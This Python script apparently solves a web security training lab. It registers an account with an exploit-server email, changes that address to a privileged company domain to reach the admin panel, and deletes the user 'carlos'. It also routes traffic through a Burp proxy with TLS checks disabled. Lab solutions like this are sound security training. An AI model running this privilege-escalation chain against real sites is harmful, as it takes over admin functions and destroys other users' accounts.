import random
import string

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers, proxies=proxies, verify=False)
    if 'Log out' in r.text:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def register(s, url, path, username, email, password):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, path),
        'username': username,
        'email': email,
        'password': password
    }
    r = s.post(target_url, data=payload)
    
    if 'Please check your emails for your account registration link' in r.text and r.status_code == 200:
        print('[+] Successful register')
    elif 'An account already exists with that username' in r.text and r.status_code == 200:
        print('[-] Account already exist')
        sys.exit(-1)
    else:
        print('[-] Failed to register')
        sys.exit(-1)

def extract_link(text, search_string):
    soup = BeautifulSoup(text, 'html.parser')
    links = []
    for link in soup.find_all('a'):
        href = link.get('href') # type: ignore
        if href and search_string in href:
            links.append(href)
    return links

def verify(s, exploit_url, exploit_path, search_string):
    target_url = exploit_url + exploit_path
    r = s.get(target_url)
    verify_link = extract_link(r.text, search_string)[0]
    r = s.get(verify_link)
    
    if 'Account registration successful!' in r.text and r.status_code == 200:
        print('[+] Successful verify register')
    else:
        print('[-] Failed verify register')
        sys.exit(-1)

def change_email(s, url, path, csrf_path, new_email):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'email': new_email
    }
    r = s.post(target_url, data=payload, allow_redirects=True)

    if new_email in r.text and r.status_code == 200:
        print(f'[+] Successful change email to {new_email}')
    else:
        print('[-] Failed to change email')
        sys.exit(-1)

def delete_user(s, url, path, username):
    target_url = url + path + '?' + f'username={username}'
    r = s.get(target_url, allow_redirects=True)
    
    if 'User deleted successfully!' in r.text and r.status_code == 200:
        print(f'[+] Successful deleted {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.abc.exploit-server.net" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1][:-1] if sys.argv[1][-1] == '/' else sys.argv[1] 
    exploit_url = sys.argv[2][:-1] if sys.argv[2][-1] == '/' else sys.argv[2]

    chars = string.ascii_lowercase
    random_str = ''.join(random.choices(chars, k=8))
    username = ''.join(random.choices(chars, k=8))
    email = random_str + f'@{exploit_url.split('//')[1]}'
    new_email = random_str + '@dontwannacry.com'
    password = ''.join(random.choices(chars, k=8))
    print(f'username={username}')
    print(f'password={password}')
    
    register(s, url, '/register', username, email, password)
    verify(s, exploit_url, '/email', '/register?temp-registration-token=')
    login_acc(s, url, '/login', username, password)
    change_email(s, url, '/my-account/change-email', '/my-account', new_email)
    delete_user(s, url, '/admin/delete', 'carlos')
    check_solved_lab(s, url)

if __name__ == '__main__':
    main()